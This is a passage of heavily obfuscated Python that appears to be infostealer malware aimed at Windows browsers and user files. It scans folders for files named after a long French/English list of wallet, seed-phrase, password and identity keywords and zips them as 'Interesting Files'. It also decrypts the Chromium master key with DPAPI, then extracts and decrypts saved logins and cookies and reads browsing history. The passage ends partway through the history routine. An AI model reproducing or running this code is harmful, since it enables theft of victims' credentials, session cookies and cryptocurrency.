        "crypto", "cryptomonnaie", "bitcoin", "btc", "eth", "ethereum", "atomic", "exodus", "binance", "metamask", "trading", "échange", "exchange", "wallet", "portefeuille", "ledger", "trezor", "seed", "seed phrase", "phrase de récupération", "recovery", "récupération", "recovery phrase", "phrase de récupération", "mnemonic", "mnémonique","passphrase", "phrase secrète", "wallet key", "clé de portefeuille", "mywallet", "backupwallet", "wallet backup", "sauvegarde de portefeuille", "private key", "clé privée", "keystore", "trousseau", "json", "trustwallet", "safepal", "coinbase", "kucoin", "kraken", "blockchain", "bnb", "usdt",
        "telegram", "disc", "discord", "token", "tkn", "webhook", "api", "bot", "tokendisc",
        "key", "clé", "cle", "keys", "private", "prive", "privé", "secret", "steal", "voler", "access", "auth",
        "mdp", "motdepasse", "mot_de_passe", "password", "psw", "pass", "passphrase", "phrase", "pwd", "passwords",
        "data", "donnée", "donnee", "donnees", "details",
        "confidential", "confidentiel", "sensitive", "sensible", "important", "privilege", "privilège"
        "vault", "safe", "locker", "protection", "hidden", "caché", "cache",
        "identity", "identité", "passport", "passeport", "permis",
        "pin", "nip",
        "leak", "dump", "exposed", "hack", "crack", "pirate", "piratage", "breach", "faille",
        "master", "admin", "administrator", "administrateur", "root", "owner", "propriétaire", "proprietaire",
        "keyfile", "keystore", "seedphrase", "recoveryphrase", "privatekey", "publickey",
        "accountdata", "userdata", "logininfo", "seedbackup",
    ]

    VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO_files = []

    for BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ in LQQVHUBXUBDWTOOVJNVBOLSBTOFWZSABXDKAUFHTLEPNUSDAVFTYNYNMTRTVBMNQKWE:
        for v4r_root, ZEQZNVOBYDOFVTXTTQXAMYFEQZMVXXTSBRLMAORIVCKJNSLAPXBQZNTZMKQKKOZLZDVRNFNEOCTs, v4r_files in os.walk(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
            for v4r_file in v4r_files:
                try:
                    if v4r_file.lower().endswith(('.txt', '.sql', '.zip')):
                        BMAQLOLBUSPYCJAOONSFUVRRBMAAJWASWDLYUZGMLPDDPTKQPTZOJOWDWIMNCDTGO = os.path.splitext(v4r_file)[0].lower()
                        for EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICXword in EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICXwords:
                            try:
                                if EVKOFFCZKFFROUVVUDPPCZMEACKVKXSJEAJVJLFKCJLMRFLQWWQSCLUUXRJYBCVRSZGJQXRLQZMWFTRDCCGXEVGDJTJFERUWMICXword.lower() == BMAQLOLBUSPYCJAOONSFUVRRBMAAJWASWDLYUZGMLPDDPTKQPTZOJOWDWIMNCDTGO:
                                    BIONVVFHXLDYYWESWKYRIMXKPALTMIZVFLJITGYIBXHXZVXCJCXQ = os.path.join(v4r_root, v4r_file)
                                    if os.path.exists(BIONVVFHXLDYYWESWKYRIMXKPALTMIZVFLJITGYIBXHXZVXCJCXQ):
                                        VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO_files.append(v4r_file)
                                        v4r_base_name, RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKR = os.path.splitext(v4r_file)
                                        with open(BIONVVFHXLDYYWESWKYRIMXKPALTMIZVFLJITGYIBXHXZVXCJCXQ, "rb") as v4r_f:
                                            KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW.writestr(os.path.join("Interesting Files", v4r_base_name + f"_{random.randint(1, 9999)}" + RMLOXOICASNGRVGSMMQMIRPCWRMVOUSMUILWPMFAKICEFUEIWBJYIKR), v4r_f.read())
                                    break
                            except: pass
                except: pass

    if VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO_files:
        OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE = sum(len(phrase.split()) for phrase in VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO_files)
    else:
        OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE = 0

    return OHRGDFOUJLQICQSMRPMUCDOZHKJCERUNHNTIXPYYDNDTRYCICLPUNKYAGUQVZLRKNBE

def MYVPZQOBGUQVVOOBSDXDRPXGIDPSEMBXILTUYSPCJBIMLNZFPZCHAUECVAGDTTRWPXCVAIPVEMDCUFMDFSUBFNJGVYHULT(KKXLQLQEXRGKNBKDEGZIVFFRLKQKFZUEZHKTKBPTBTCSZYESGFMKXW):
    import os
    import psutil
    import json
    import base64
    import sqlite3
    import win32crypt
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

    global WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ, IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ, OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO, LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK, THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF, ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU

    XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY = ["extentions", "passwords", "cookies", "history", "downloads"]
    XHMAJNFEHLLTTLMHBYKIYDYLBEJMIUPKOBGGZHAANTNFIGFNLDPNEWMYSKCXXAFAFPUFPIIIDVJNSCPKEXMXYVSCXSMHOHCREI = []

    if "extentions" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ = 0
    else:
        WJVLHCGOFLUZAXIPYBORMGLZDJDOMTNQIDVETIHIKARLYPTYRQ = None

    if "passwords" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ = []
        IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ = 0
    else:
        ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ = ""
        IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ = None
    if "cookies" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX = []
        OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO = 0
    else:
        SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX = ""
        OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO = None
    if "history" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND = []
        LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK = 0
    else:
        LAOUUPDGHKFIQTNFJGCQQFRSLCEBBNBECXVGIFQELPZNQSWAZYPLLPKNVND = ""
        LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK = None
    if "downloads" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG = []
        THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF = 0
    else:
        EUKOHSSNAEVMFEJPUFTRHQAMQNXAZDZFIGNZGIUOECWPYQQDSLG = ""
        THJSRYXEPKKJMSXJXRZDOGGDYIVHJVUMFSFLREQWLQEFSXHVSF = None
    if "cards" in XOAHGYWDJZVORBCTLBLPBWQLDORGAZHMTKWCUDEPFNNLSMQEXOHVPALIZAIOVSQSVBXDPNVWXTPBPPLEJRNMOXMGFNXNLBKY:
        WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ = []
        ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU = 0
    else:
        WEMCBNBUNERKUMWGGHRPWNOQYUBNJQAOTVUUBWJCLVKZFJAQVFRNIJYWXDEMJOGXNNPNLNPBGTGOJBLJQMPJELYKVEFJ = ""
        ZDMOHDEYPMRCPXIHNQPRWTETHBZHUXFMUZLKXFHSUIOGMFWAMSFGECMGOKMJU = None
    
    def MTAZZWJNTARMXPZECPXKXKTDCOLQJXYMOPDLYRYWQYPZXQKYDAWFDSHUSYYNPUOTDVLXDQYZAUGVKTOGTRQ(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
        if not os.path.exists(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ):
            return None

        try:
            with open(BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ, 'r', encoding='utf-8') as v4r_f:
                XEKSEEMLWGAJJDMMFSXSLLTCMNULQVLDYMKDMFANDNYPEWUGKJY = json.load(v4r_f)

            CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_key = base64.b64decode(XEKSEEMLWGAJJDMMFSXSLLTCMNULQVLDYMKDMFANDNYPEWUGKJY["os_crypt"]["encrypted_key"])[5:]
            HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV = win32crypt.CryptUnprotectData(CSQBCKGIHCLTUPBISDQPQOLEBOXZHGDXHVTYVZKUUQDCOKBYLAPWUAUWLCK_key, None, None, None, 0)[1]
            return HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV
        except:
            return None

    def LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV):
        try:
            ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH = YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN[3:15]
            HEPOPRQDRHROFDLVSICGCKZKJKVFVBQDDZZBAHSQSACXHKZEIHMGIWNREHVXASKKKUTDUNPNIQEVYGESBZBXWGEOVXJRMAVJAF = YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN[15:-16]
            BKFHILXAXPIIRBKCCMXMARJNPXIGFLHJPMVSJYOUNGSKGRHBSDQVXAPODHD = YFTAHRCNEPDLSXPVZUBZZPUYBSSZPFUIUGXIJWWCAYOFSTWXAAFEYTHDUIIPNZZMBOXZUKSHXOFFVPCVTVZPJSATBDMCWMUNLJN[-16:]
            JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW = Cipher(algorithms.AES(HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV), modes.GCM(ZEMNJDPOEXZEYMMGBDLVMZPIPDHQEETGEEOJCYFOLPMUXLFNLQQTH, BKFHILXAXPIIRBKCCMXMARJNPXIGFLHJPMVSJYOUNGSKGRHBSDQVXAPODHD))
            FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH = JYHTWFWFHOKRALNVITHAOFXQRTHJVNKQOEIADGBVTQKTWHVEYUILCZTHBRZYTZKW.decryptor()
            SOBABFHYFNRENJWCXQDHGMGQLBAXGDQQAIRGVKBKAAZSRSZTGVMIIVEUYRIFZZYHDKLEKUNXXEZLUKYJFEAARDRXSLJKOX = FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH.update(HEPOPRQDRHROFDLVSICGCKZKJKVFVBQDDZZBAHSQSACXHKZEIHMGIWNREHVXASKKKUTDUNPNIQEVYGESBZBXWGEOVXJRMAVJAF) + FCRHSZAXHFSPHZWANTMUEWYDRKZAJPILRQIIBGEACHIJVEUTJPQXOCDQFNRYSZH.finalize()
            return SOBABFHYFNRENJWCXQDHGMGQLBAXGDQQAIRGVKBKAAZSRSZTGVMIIVEUYRIFZZYHDKLEKUNXXEZLUKYJFEAARDRXSLJKOX.decode()
        except:
            return None
        
    def EIZLCFJKTYNPMNXQPLGTABQVXYGNQBEUKNOSNDQZWZFWRLSJKIWEJWDMLPQRKVQLDUNWRVYPYIVGLTYRYEI(YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV):
        global IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ
        RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG_db = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'Login Data')
        if not os.path.exists(RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG_db):
            return

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL = sqlite3.connect(":memory:")
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA = sqlite3.connect(RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG_db)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.backup(MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.close()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH = MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.cursor()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.execute('SELECT action_url, username_value, password_value FROM logins')

        for v4r_row in TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ =          f"- Url      : {v4r_row[0]}"
            OVIRYFJZPLCYDXOCWGARNEMHKUDYJGWGDENDNHUCEOMPCEUQWLAIRNQYWTECZOCSEAVPOJPULCDFQNRUYEENCPLPTVEPII =     f"  Username : {v4r_row[1]}"
            RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG =     f"  Password : {LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(v4r_row[2], HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)}"
            YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name = f"  Browser  : {YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ}"
            ESJQGEIRNDJZPEHTOZHZBXQDJTTYTVANDSNDGZHLGNYDQSYBTRJ.append(f"{QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ}\n{OVIRYFJZPLCYDXOCWGARNEMHKUDYJGWGDENDNHUCEOMPCEUQWLAIRNQYWTECZOCSEAVPOJPULCDFQNRUYEENCPLPTVEPII}\n{RWOLCHLYTFMEPQTRYAFREMFGDOUWYYEOOUFVLCXOXYVIMOSBSWINQGKBHCDEQYENODADOACFQAOHDCVRVOG}\n{YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name}\n")
            IHRHQZQLZZZDFNPURSUBMFLZHDQLMZOLVSQHZBLYVFEZNYCHDCTLWZZABVHBMOKAPORHXFUPYBONAXEMTMIEDQRNMEXZWXQ += 1

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.close()

    def ZXOWHCXNJCJNFZEDDEGFVODTEKRKEBQKFXKFBBZQFQGWFYLZLNFP(YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV):
        global OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO
        KOQDLVQACPJOJJOMCJDBNWNCHZQCWQNXUCTTVTPHZWROXJMHHJXWIWXCISERJGWQVZTQJFFCG = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'Network', 'Cookies')
        if not os.path.exists(KOQDLVQACPJOJJOMCJDBNWNCHZQCWQNXUCTTVTPHZWROXJMHHJXWIWXCISERJGWQVZTQJFFCG):
            return

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL = sqlite3.connect(":memory:")
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA = sqlite3.connect(KOQDLVQACPJOJJOMCJDBNWNCHZQCWQNXUCTTVTPHZWROXJMHHJXWIWXCISERJGWQVZTQJFFCG)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.backup(MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.close()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH = MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.cursor()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

        for v4r_row in TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2] or not v4r_row[3]:
                continue
            QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ =          f"- Url     : {v4r_row[0]}"
            VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO =         f"  Name    : {v4r_row[1]}"
            BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ =         f"  Path    : {v4r_row[2]}"
            NCIOORYRJZVDRMCGSRSWVEKKFYJRQRKEGZLRXYVWVIROOEPDXTXLVCMJZJ =       f"  Cookie  : {LLJCTWGKIJYQVMPWMUJYNSNQTXFQCINYRKOHQCZBOILYICUYZPQVAHVRTHXNMOZHCTPEFRFUQPDNGMJVORGAUTLRQ(v4r_row[3], HGZAIWSDGEDXUSCAEWEHSTOERSLXEFRDXRGVWOPXRCOCDYLQNRUSVUEVROQABJCYHYPCAZMRANQWVULNV)}"
            LBXGIEQEFFFMOYYHFXOJMOLVFAZSDEPWBTTGVKJQLWYXWZHCBMDYLHCAPA =       f"  Expire  : {v4r_row[4]}"
            YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name = f"  Browser : {YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ}"
            SJDSHEGMXJEKZFUMPCILQIHUXXLOTTGBCMTXAVFRAIGDDPKEFQZITRRKBDMX.append(f"{QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ}\n{VPEXUXYAMKXFXGWQRTPXKVUBZPMMYCBECXGTOSZHCUQOIDGBHOOUZOZGZKNMUQO}\n{BJXOWMYSMMYSJCVHTTXPKZUHWEURWHURBSPLLJQBKFZYWCNTCEQVTHXGKAQIINGONILHMMXBUWGXXBGAWZSRQLJ}\n{NCIOORYRJZVDRMCGSRSWVEKKFYJRQRKEGZLRXYVWVIROOEPDXTXLVCMJZJ}\n{LBXGIEQEFFFMOYYHFXOJMOLVFAZSDEPWBTTGVKJQLWYXWZHCBMDYLHCAPA}\n{YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ_name}\n")
            OUQYWXQYDRBWWELOVBCVPPENSOZQKJGPLNKUMGFSRAVCULHPLWO += 1

        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.close()

    def SBZOLDYAQAJYPVAFLLTYAUAEOWUSXQAAEKPZCIMSEQKEHHTUAYXCGLDDUEBSFXJSNJEINIEYJYPAMZEW(YRBAXHFYRUHBVLVSCSYQOZOSQKZVTYOXPWNIYGGDLHSQPMYSGJQVEITFIPQ, GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA):
        global LEGMWKDGKYFELYOPFTUFJXNRHGUBVDYGRLLYQMZRAJYADMROUXUTMSSYRZHZBSNEVUILNXEHNLHXLFYYETNCECKVXJCHPXTMXJK
        CHEIPOEHNATHQJFSHPMCFKRRDYCMLAZMMZHOFTYWJRIZRCGNFZOOIMBWDJYNJSPIVXDZABEIWQFZNOT = os.path.join(GEUNQAJXTRSHEBCZCCMQKVFIYXYROBCIFXQCSRPAEBEEWVCXKGMPYSEKZA, 'History')
        if not os.path.exists(CHEIPOEHNATHQJFSHPMCFKRRDYCMLAZMMZHOFTYWJRIZRCGNFZOOIMBWDJYNJSPIVXDZABEIWQFZNOT):
            return
        
        MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL = sqlite3.connect(":memory:")
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA = sqlite3.connect(CHEIPOEHNATHQJFSHPMCFKRRDYCMLAZMMZHOFTYWJRIZRCGNFZOOIMBWDJYNJSPIVXDZABEIWQFZNOT)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.backup(MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL)
        NGLTNZBXMGZUSNJPRHHJZBUBIULBAMDICVMSMGRVTPARJCHCAIYEQTWWWKGTYPRFUA.close()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH = MXYMWXLNOKXGNLBWTXRBUTWPHJPXZEAKPBSWTFTRIGVMCOLBKUHGAWDKCSMKVIDXGEWJJCARLDPHYNLYUPDDOLHHL.cursor()
        TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.execute('SELECT url, title, last_visit_time FROM urls')

        for v4r_row in TMODGGCKRTTNOMQZNGPXKPPVYAWCXTIOJXFBWJBFJXHZNROBLXZTIOTDGHDTKOEABKXWGDXTBLATLH.fetchall():
            if not v4r_row[0] or not v4r_row[1] or not v4r_row[2]:
                continue
            QIQQXZIUPXYGTTWSJNFLCSLTUHCWHZLGKSZYJKRCPZDJYEBMSTTAJ =          f"- Url     : {v4r_row[0]}"
            KBDUZRMWIBODDUUAAWFQZAEJXPUAKWBNKGWATAWRCLBIRXVONZRVVCGSPUIRS =        f"  Title   : {v4r_row[1]}"
